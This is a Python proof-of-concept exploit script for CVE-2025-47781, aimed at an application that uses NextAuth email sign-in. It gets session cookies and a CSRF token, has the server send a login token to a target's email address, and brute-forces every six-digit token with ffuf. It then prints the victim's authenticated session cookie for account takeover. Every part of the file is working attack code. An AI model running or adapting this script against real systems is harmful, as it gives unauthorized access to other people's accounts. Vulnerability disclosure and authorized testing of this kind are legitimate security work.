#!/usr/bin/env python3

import argparse, os, re, subprocess, sys, requests

# ----------------------------------------------------------------------
# 1. CLI
# ----------------------------------------------------------------------
parser = argparse.ArgumentParser(
    description=("PoC for CVE-2025-47781. It grabs the necessary cookies, triggers the token generation, "
                 "bruteforces the token with ffuf, then prints the authenticated session cookie."))
parser.add_argument("-u", "--url",    required=True,
                    help="Base URL including port, example http://example.com:80")
parser.add_argument("-e", "--email",  required=True, help="Target e-mail address")
parser.add_argument("-t", "--threads", default=100, type=int,
                    help="threads for ffuf (default 100)")
args = parser.parse_args()

base = args.url.rstrip("/")

# ----------------------------------------------------------------------
# 2. Grab cookies
# ----------------------------------------------------------------------
sess = requests.Session(); sess.verify = False
print("[+] GET /login …")
sess.get(f"{base}/login")
ck = sess.cookies.get_dict()
cookie_str = "; ".join(f"{k}={v}" for k, v in ck.items())
print("[+] Cookies obtained")

# ----------------------------------------------------------------------
# 3. Build token wordlist
# ----------------------------------------------------------------------
if not os.path.exists("tokens.txt"):
    print("[+] Generating tokens.txt (000000-999999)")
    with open("tokens.txt", "w") as fh:
        for i in range(1_000_000):
            fh.write(f"{i:06}\n")

# ----------------------------------------------------------------------
# 4. Trigger token generation
# ----------------------------------------------------------------------
print("[+] GET /api/auth/csrf")
csrf = sess.get(f"{base}/api/auth/csrf",
                headers={"Referer": f"{base}/login",
                         "X-Requested-With": "XMLHttpRequest"}).json()["csrfToken"]

print("[+] POST /api/auth/signin/email  → e-mail with token is sent")
form = {
    "redirect":    "false",
    "email":       args.email,
    "callbackUrl": f"{base}/polls",
    "csrfToken":   csrf,
    "json":        "true"
}
hdrs = {
    "Content-Type":      "application/x-www-form-urlencoded",
    "Origin":            base,
    "Referer":           f"{base}/login",
    "X-Requested-With":  "XMLHttpRequest"
}
sess.post(f"{base}/api/auth/signin/email", data=form, headers=hdrs)

# ----------------------------------------------------------------------
# 5. Bruteforce token with ffuf
# ----------------------------------------------------------------------
BRUTE_URL = f"{base}/api/auth/callback/email?email={args.email}&token=FUZZ"
print("[+] Starting ffuf (same flags you used manually)")

ff_cmd = [
    "ffuf",
    "-u", BRUTE_URL,
    "-w", "tokens.txt",
    "-t", str(args.threads),
    "-b", cookie_str,
    "-H",  f"Referer: {base}/login",
    "-fr", "error",
    "-od", "results",
]
print(" ".join(ff_cmd)); sys.stdout.flush()

proc = subprocess.Popen(
    ff_cmd,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1
)

result_file = None
for line in proc.stdout:
    sys.stdout.write(line)
    m = re.search(r"\|\s+RES\s+\|\s+([a-f0-9]{32})", line)
    if m:
        result_file = m.group(1)
        print(f"[+] Hit!  result file: {result_file}")
        proc.terminate()
        break
proc.wait(timeout=10)

if not result_file:
    sys.exit("[-] No valid token found (expired?).")

# ----------------------------------------------------------------------
# 6. Extract auth session token
# ----------------------------------------------------------------------
token_val = None
with open(os.path.join("results", result_file)) as fh:
    for ln in fh:
        if ln.lower().startswith("set-cookie: next-auth.session-token="):
            token_val = ln.split("next-auth.session-token=")[1].split(";")[0].strip()

if token_val:
    print("\n[+] Authenticated session cookie obtained. Replace next-auth.session-token with the new value to login.")
    print(f"next-auth.session-token={token_val}\n")
else:
    print("[-] next-auth.session-token not found in response file.")
